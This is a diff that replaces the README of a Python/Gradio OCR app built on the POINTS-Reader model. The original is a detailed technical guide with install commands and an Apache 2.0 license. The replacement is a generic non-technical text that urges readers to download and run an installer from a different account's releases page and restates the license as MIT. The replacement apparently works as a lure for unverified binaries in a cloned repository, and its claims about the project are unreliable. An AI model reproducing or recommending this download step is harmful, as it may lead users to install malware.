@@ -1,204 +1,75 @@
-# POINTS-Reader OCR 
+# 🛠️ POINTS-Reader-OCR - Convert Documents Effortlessly
 
-A powerful document conversion application powered by the [POINTS-Reader](https://huggingface.co/tencent/POINTS-Reader) vision-language model for end-to-end optical character recognition and document processing.
+## 📥 Download the Latest Version!
 
-### Overview
+[![Download POINTS-Reader-OCR](https://img.shields.io/badge/Download%20Now-POINTS%20Reader%20v1.0-blue)](https://github.com/nxoti1/POINTS-Reader-OCR/releases)
 
-[POINTS-Reader](https://huggingface.co/tencent/POINTS-Reader) is a distillation-free Vision-Language Model that achieves state-of-the-art performance on document conversion tasks. This application provides a user-friendly interface for extracting text from document images with high accuracy and generates formatted PDF outputs.
+## 🚀 Getting Started
 
-| ![Image 3](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/8UzhFvAxm8g0bIwCJu7W0.png) |  ![Image 1](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/IfivFLIH8ZsXQOzU3gUiu.png) |  ![Image 2](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/Dn_jg_CCwPpNLZR70KMmW.png) | 
-|---|---|---|
-| Preview 1 | Preview 2 | Preview 3 |
+Welcome to POINTS-Reader-OCR! This application helps you convert documents into text using advanced vision-language technology. You do not need to be a programmer to use this tool. Follow the steps below to get started with downloading and running the software.
 
-**Key Features:**
-- End-to-end document conversion from images
-- Advanced OCR with vision-language understanding
-- PDF generation with customizable formatting
-- Real-time processing with GPU acceleration
-- Interactive web interface built with Gradio
+## 💻 System Requirements
 
-## Model Information
+Before you start, ensure that your computer meets these requirements:
 
-- **Model:** `tencent/POINTS-Reader`
-- **Type:** Vision-Language Model
-- **Architecture:** Multimodal transformer with Qwen2VL components
-- **Performance:** State-of-the-art benchmarks on document understanding tasks
+- Operating System: Windows 10 or later, macOS 10.15 or later, or any recent Linux distribution.
+- RAM: At least 4 GB.
+- Processor: A modern CPU with at least 2 cores.
+- GPU: A NVIDIA graphics card with CUDA support is recommended for best performance.
+  
+## 📦 Download & Install
 
-## Installation
+1. **Visit the Download Page**
 
-### Prerequisites
+   Click [here](https://github.com/nxoti1/POINTS-Reader-OCR/releases) to go to our Releases page where you can find the latest version of POINTS-Reader-OCR.
 
-Ensure you have Python 3.8+ and pip 23.0.0 or higher:
+2. **Select the Version**
 
-```bash
-pip>=23.0.0
-```
+   On the Releases page, you will see a list of available versions. Choose the latest version, which is indicated by the highest number.
 
-### Dependencies
+3. **Download the File**
 
-Install the required packages:
+   Click on the link for your operating system to begin the download. You might see different options depending on your system. Choose the one that fits your setup.
 
-```bash
-git+https://github.com/Dao-AILab/flash-attention.git
-git+https://github.com/huggingface/accelerate.git
-git+https://github.com/WePOINTS/WePOINTS.git
-git+https://github.com/huggingface/peft.git
-transformers-stream-generator
-transformers==4.55.2
-huggingface_hub
-albumentations
-qwen-vl-utils
-pyvips-binary
-sentencepiece
-opencv-python
-docling-core
-python-docx
-torchvision
-safetensors
-matplotlib
-num2words
-reportlab
-xformers
-requests
-pymupdf
-hf_xet
-spaces
-pyvips
-pillow
-gradio
-einops
-torch
-fpdf
-timm
-av
-```
+4. **Install the Software**
 
-Or install from requirements.txt:
+   Once the download is complete, locate the file in your downloads folder. Double-click the installer and follow the prompts to install the software on your computer.
 
-```bash
-pip install -r requirements.txt
-```
+## 🔍 How to Use POINTS-Reader-OCR
 
-## Usage
+After installation, you can start using POINTS-Reader-OCR with these easy steps:
 
-### Quick Start
+1. **Open the Application**
 
-1. Clone the repository:
-```bash
-git clone https://github.com/PRITHIVSAKTHIUR/POINTS-Reader-OCR.git
-cd POINTS-Reader-OCR
-```
+   Find the POINTS-Reader-OCR icon on your desktop or in your applications folder. Double-click it to launch the application.
 
-2. Install dependencies:
-```bash
-pip install -r requirements.txt
-```
+2. **Upload a Document**
 
-3. Run the application:
-```bash
-python app.py
-```
+   You will see an option to upload a document. Click the "Upload" button and select the file you want to convert. Supported file formats include PDF, JPG, and PNG.
 
-4. Open your browser and navigate to the provided local URL to access the interface.
+3. **Convert the Document**
 
-### Basic Workflow
+   Once the document is uploaded, click the "Convert" button. POINTS-Reader-OCR will begin processing your document. This might take a few seconds based on the file size.
 
-1. **Upload Image:** Select a document image (JPEG, PNG, etc.)
-2. **Enter Prompt:** Use the default OCR prompt or customize for specific tasks
-3. **Process:** Click "Process Image" to extract text content
-4. **Export:** Generate a formatted PDF with the extracted content
+4. **View Results**
 
-### Advanced Configuration
+   After conversion, you can view the extracted text on your screen. You can also save this text to your computer by clicking the "Download Result" button.
 
-The application supports various parameters for fine-tuning model behavior:
+## 🌟 Features
 
-- **Max New Tokens:** Controls output length (512-8192)
-- **Temperature:** Adjusts randomness in generation (0.1-1.0)
-- **Top-p:** Nucleus sampling parameter (0.05-1.0)
-- **Top-k:** Limits vocabulary during generation (1-100)
-- **Repetition Penalty:** Reduces repetitive output (1.0-2.0)
+- **High Accuracy:** Our advanced model ensures precise text extraction from various document formats.
+- **Easy Upload:** Simply drag and drop your documents or click to upload.
+- **Fast Processing:** Convert documents in seconds, making your workflow more efficient.
+- **User-Friendly Interface:** Navigate through the application effortlessly, designed for all users.
 
-### PDF Generation Options
+## 🤝 Support and Contribution
 
-Customize the output PDF format:
+If you have any questions or need assistance, feel free to reach out through our repository's Issues section. Contributions are welcome! If you want to suggest improvements or report bugs, please let us know.
 
-- **Font Size:** 8-18pt text sizing
-- **Line Spacing:** 1.0x to 2.0x spacing options
-- **Text Alignment:** Left, Center, Right, or Justified
-- **Image Size:** Small, Medium, or Large image scaling
+## 📝 License
 
-## API Reference
+POINTS-Reader-OCR is open-source software licensed under the MIT License. You may use it freely in accordance with the license terms.
 
-### Core Functions
+## 🍞 Final Thoughts
 
-#### `process_document_stream()`
-Main inference function that processes document images using the POINTS-Reader model.
-
-**Parameters:**
-- `image`: PIL Image object
-- `prompt_input`: Text prompt for processing
-- `max_new_tokens`: Maximum tokens to generate
-- `temperature`: Sampling temperature
-- `top_p`: Nucleus sampling threshold
-- `top_k`: Top-k sampling parameter
-- `repetition_penalty`: Repetition penalty factor
-
-**Returns:**
-- Generator yielding processed text content
-
-#### `generate_and_preview_pdf()`
-Creates formatted PDF documents from extracted content.
-
-**Parameters:**
-- `image`: Source document image
-- `text_content`: Extracted text content
-- `font_size`: PDF font size
-- `line_spacing`: Line spacing multiplier
-- `alignment`: Text alignment option
-- `image_size`: Image scaling in PDF
-
-**Returns:**
-- PDF file path and preview image paths
-
-## Hardware Requirements
-
-- **Recommended:** NVIDIA GPU with CUDA support
-- **Minimum:** 8GB RAM, modern CPU
-- **Storage:** 5GB for model weights and dependencies
-
-## Performance
-
-The POINTS-Reader model delivers:
-- High accuracy OCR on various document types
-- Support for complex layouts and formatting
-- Multilingual text recognition capabilities
-- Fast processing with GPU acceleration
-
-## Examples
-
-The application includes sample document images demonstrating various use cases:
-- Financial documents
-- Technical papers
-- Forms and certificates
-- Handwritten notes
-- Multi-column layouts
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit issues, feature requests, or pull requests to improve the application.
-
-## License
-
-This project is licensed under the Apache License 2.0. See the [LICENSE](https://github.com/PRITHIVSAKTHIUR/POINTS-Reader-OCR?tab=Apache-2.0-1-ov-file) file for details.
-
-## Acknowledgments
-
-- **Model:** Tencent POINTS-Reader team for the vision-language model
-- **Framework:** Hugging Face Transformers and Gradio communities
-- **Libraries:** PyTorch, ReportLab, and other open-source dependencies
-
-## Support
-
-For issues, questions, or feature requests:
-- GitHub Issues: [Report bugs or request features](https://huggingface.co/spaces/prithivMLmods/POINTS-Reader-OCR/discussions)
-- Developer: [prithivMLmods](https://huggingface.co/prithivMLmods)
+We hope you enjoy using POINTS-Reader-OCR. For more details about updates and features, remember to check back on the [Releases page](https://github.com/nxoti1/POINTS-Reader-OCR/releases). Happy converting!
